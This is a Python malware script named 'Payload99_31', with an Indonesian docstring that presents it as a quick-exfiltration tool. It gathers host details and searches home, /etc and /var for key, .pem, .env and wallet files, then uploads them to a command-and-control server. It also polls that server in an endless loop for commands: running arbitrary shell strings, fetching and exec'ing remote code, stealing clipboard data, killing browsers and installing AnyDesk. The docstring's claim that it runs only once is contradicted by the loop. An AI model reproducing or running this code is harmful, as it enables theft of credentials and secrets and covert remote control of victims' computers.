import os
import platform
import socket
import requests
import subprocess
import time


kegunaan = """
Fungsi Utama:

Mengumpulkan informasi sistem (OS, hostname, username, arsitektur).
Mengunggah file sensitif ke server C2.
Mengeksekusi perintah dari C2 secara satu kali (on-demand execution).

🔹 Karakteristik:

Tidak mempertahankan koneksi persisten ke C2, hanya berjalan sekali.
Mengunggah informasi dan file ke endpoint /keys dan /uploads.
Mengeksekusi perintah yang dikirim dari C2 /cmd, lalu berhenti.

🔹 Kegunaan:
✔ Eksfiltrasi cepat data sistem dan file sensitif tanpa meninggalkan jejak jangka panjang.
✔ Serangan satu kali, cocok untuk target yang memiliki waktu eksekusi terbatas.

"""

def collect_system_info():
    system_info = {
        "os": platform.system(),
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os_version": platform.version(),
        "architecture": platform.architecture()[0],
    }
    return system_info


def send_data_to_c2(data):
    url_c2 = "http://192.168.0.85:1224/keys"
    try:
        response = requests.post(url_c2, json=data, timeout=10)
        if response.status_code == 200:
            print("[+] Data successfully sent to C2.")
        else:
            print("[-] Failed to send data to C2.")
    except requests.RequestException:
        print("[-] Error connecting to C2.")


def search_sensitive_files():
    search_paths = [os.path.expanduser("~"), "/etc", "/var"]
    sensitive_files = []
    for path in search_paths:
        if os.path.exists(path):
            for root, _, files in os.walk(path):
                for file in files:
                    if any(ext in file for ext in [".pem", ".key", "config", ".env", ".wallet"]):
                        sensitive_files.append(os.path.join(root, file))
    return sensitive_files


def upload_files_to_c2(files):
    url_c2 = "http://192.168.0.85:1224/uploads"
    for file in files:
        try:
            with open(file, "rb") as f:
                requests.post(url_c2, files={"file": f}, timeout=10)
            print(f"[+] Uploaded: {file}")
        except Exception:
            print(f"[-] Failed to upload: {file}")


def execute_remote_commands():
    url_c2 = "http://192.168.0.83:1224/cmd"
    try:
        response = requests.get(url_c2, timeout=10)
        if response.status_code == 200:
            commands = response.json().get("commands", [])
            for cmd in commands:
                if cmd.startswith("SSH_OBJ"):
                    os.system(cmd.replace("SSH_OBJ ", ""))
                elif cmd == "SSH_CMD":
                    os.system("taskkill /IM python.exe /F")
                elif cmd == "CALC":
                    os.system("calc.exe")
                elif cmd == "SSH_CLIP":
                    clipboard_data = subprocess.check_output("powershell Get-Clipboard", shell=True)
                    requests.post("http://192.168.0.85:1224/api/clip", json={"clipboard": clipboard_data.decode()})
                elif cmd.startswith("SSH_RUN"):
                    url = cmd.split(" ")[1]
                    payload = requests.get(url).text
                    exec(payload)
                elif cmd == "SSH_KILL":
                    os.system("taskkill /IM chrome.exe /F && taskkill /IM brave.exe /F")
                elif cmd == "SSH_ANY":
                    os.system(
                        "powershell -Command Invoke-WebRequest http://192.168.0.85:1224/anydesk -OutFile 'C:\\temp\\anydesk.exe'; Start-Process 'C:\\temp\\anydesk.exe'")
                elif cmd == "SSH_ENV":
                    env_files = [os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\Shell\\Favorites"),
                                 "C:\\Windows\\System32\\drivers\\etc\\hosts"]
                    for file in env_files:
                        if os.path.exists(file):
                            with open(file, "r") as f:
                                requests.post("http://192.168.0.85:1224/uploads", files={"file": f})

    except requests.RequestException:
        print("[-] Error fetching commands from C2.")

def persistent_connection():
    while True:
        execute_remote_commands()
        time.sleep(30)

def main():
    print("[+] Payload99_31 executing...")
    system_info = collect_system_info()
    send_data_to_c2(system_info)

    files = search_sensitive_files()
    if files:
        upload_files_to_c2(files)

    persistent_connection()
    print("[+] Payload99_31 execution completed.")


if __name__ == "__main__":
    main()
